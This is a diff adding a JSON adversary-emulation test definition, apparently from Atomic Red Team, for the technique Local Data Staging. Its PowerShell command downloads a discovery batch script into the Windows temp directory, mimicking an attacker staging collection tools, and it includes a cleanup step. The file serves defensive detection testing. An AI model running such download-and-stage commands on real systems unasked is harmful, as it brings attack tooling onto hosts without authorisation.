@@ -1,0 +1,30 @@
+{
+    "name": "Stage data from Discovery.bat",
+    "description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution, verify that the file is saved in the temp directory. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile #{output_file}\n",
+        "cleanup_command": "Remove-Item -Force #{output_file} -ErrorAction Ignore\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1074.001",
+    "tactics": [
+        "Collection"
+    ],
+    "technique": "Local Data Staging",
+    "source": "ART",
+    "uuid": "107706a5-6f9f-451a-adae-bab8c667829f",
+    "arguments": {
+        "output_file": {
+            "description": "Location to save downloaded discovery.bat file",
+            "type": "path",
+            "default": "$env:TEMP\\discovery.bat"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
